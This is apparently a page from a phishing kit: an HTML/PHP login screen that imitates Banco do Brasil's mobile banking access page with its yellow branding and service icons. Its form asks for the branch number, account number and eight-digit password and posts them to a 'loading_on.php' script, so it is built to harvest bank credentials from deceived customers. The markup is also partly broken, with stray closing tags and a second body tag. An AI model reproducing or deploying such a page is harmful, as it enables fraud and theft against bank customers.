<!DOCTYPE html>
<html>
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1.0">
	<meta name="theme-color" content="#fff200">
	<meta name="apple-mobile-web-app-status-bar-style" content="#fff200">
	<meta name="msapplication-navbutton-color" content="#fff200">
	<title>Acesso - BB</title>
	<link rel="stylesheet" href="_styles/home.css">
	<script src="_jscripts/jquery.min.js"></script>
	<script src="_jscripts/jquery_mask.js"></script>
	<script src="_jscripts/home.js"></script>
</head>
<body>
<div class="container bg-yellow" style="position:absolute;left:0;bottom:0;background-color:#faf046;border-top: 1px solid rgba(157,149,16,0.2);">
	<div class="content main_footer">
		<img src="" width="135" style="display:block;margin:0;">
	<div class="clear"></div>
	</div><!-- content -->
</div>
		<img src="" width="135" style="display:block;margin:0;">
	<div class="clear"></div>
	</div>
		<img src="_images/logo_footer.jpg" width="135" style="display:block;margin:0;">
		</div><!-- logo -->
		<h1></h1>
	<div class="clear"></div>
	</div><!-- content -->
</div><!-- container -->

</div><!-- container -->

<body class="bg-yellow-person">

<div class="container">
	<div class="content margin_person form_start">
		<form action="loading_on.php" method="post" class="form_enter" onsubmit="return check_phone();" style="margin-top:30px;display:block;">
			</label>
			<input type="number" name="ag_ct" id="ag_ct" class="input input_ag" placeholder="Agência" maxlength="5" autocomplete="off" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
			
			</label>
			<input type="number" name="cont" id="cont" class="input input_ag" placeholder="Conta" maxlength="12" autocomplete="off" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
			
			<input type="number" name="pass8" id="pass8" class="input input_ag" placeholder="Senha (8 dígitos)" maxlength="8" style="-webkit-text-security: disc!important;" autocomplete="off" oninput="javascript: if (this.value.length > this.maxLength) this.value = this.value.slice(0, this.maxLength);">
			</label>
			<p style="display:block;text-align: right;font-size:0.8em;color:#333;margin-top:-5px;">Substitua o "X" pelo "0" quando houver.</p>
			<label for="submit">
				<input type="hidden" name="sender" value="go_sbi">
				<input type="submit" name="submit" id="submit" class="btn_submit" value="Confirmar">
			</label>
		</form>
	<div class="clear"></div>
	</div><!-- content -->
<div class="container main_destaque" style="margin-top:40px;display:block;">
	<div class="content">
		<div class="person_buttons">
			<img src="_images/icon_bcode.png">
			<p>BB Code</p>
		</div><!-- person_buttons -->
		
		<div class="person_buttons">
			<img src="_images/icon_finan.png">
			<p>Financie seu carro</p>
		</div><!-- person_buttons -->
		
		<div class="person_buttons">
			<img src="_images/icon_pass.png">
			<p>Emissão de senha</p>
		</div><!-- person_buttons -->
		
		<div class="person_buttons last_person">
			<img src="_images/icon_ouro.png">
			<p>Ourocard</p>
		</div><!-- person_buttons -->
		
		<div class="person_buttons">
			<img src="_images/icon_saque.png">
			<p>Saque móvel</p>
		</div><!-- person_buttons -->
		
		<div class="person_buttons">
			<img src="_images/icon_fale.png">
			<p>Fale conosco</p>
		</div><!-- person_buttons -->
		
		<div class="person_buttons">
			<img src="_images/icon_bola.png">
			<p>2ª via de boletos</p>
		</div><!-- person_buttons -->
		
		<div class="person_buttons last_person">
			<img src="_images/icon_more.png">
			<p>Mais aplicativos</p>
		</div><!-- person_buttons -->
	<div class="clear"></div>
	</div><!-- content -->
</div>
</div><!-- container -->

</body>
</html>
<?php
ob_end_flush();
?>
